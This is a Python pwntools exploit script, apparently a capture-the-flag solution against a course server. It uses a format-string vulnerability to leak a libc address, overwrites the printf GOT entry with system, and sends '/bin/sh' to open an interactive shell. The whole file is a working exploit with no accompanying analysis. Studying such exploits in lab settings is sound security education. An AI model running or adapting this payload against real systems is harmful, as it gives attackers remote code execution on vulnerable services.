#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")
# 
# 
# context.arch = "i386"  # Specify 32-bit architecture


context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *parse_loop+81
            b *parse_loop+111
            c
            b *system
            c
            c
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10058)

    return r
def main():
    r = conn(3)
    # 25:0094│-394 0xffec0eb4 —▸ 0xf7dc62cd ◂— insb byte ptr es:[edi], dx /* 'ld-linux.so.2' */

    r.sendlineafter(b"Input: ", b"AAAA" + b".%08x"*10 + b"PossLEAK" + b"->%37$08x-") # leak the stack position of buff and leak libc address

    offset = 6
    r.recvuntil(b"->")
    leakLibcAddr = int(r.recvuntil(b"-")[:-1],16)

    print("LeakLibcAddr = " + hex(leakLibcAddr))

    sLeakLibcAddr = 0xf7d852cd
    sBaseLibc =     0xf7d72000
    offsetBaseLibc = sBaseLibc - sLeakLibcAddr

    libc.address = leakLibcAddr + offsetBaseLibc

    writes = {e.got["printf"]: libc.symbols["system"] + 16} # this plus 16 are duo to libc deslocation at the server not absolute sure about the reason
    payload = fmtstr_payload(offset, writes,  badbytes=frozenset(b" "))

    r.sendlineafter(b"Input: ", payload)
    r.sendline("/bin/sh\x00")
    r.interactive()

if __name__ == "__main__":
    main()